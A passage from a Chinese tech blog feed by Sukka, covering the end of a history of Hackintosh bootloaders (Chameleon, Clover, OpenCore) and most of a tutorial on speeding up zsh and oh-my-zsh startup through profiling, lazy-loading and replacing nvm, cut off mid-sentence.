Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 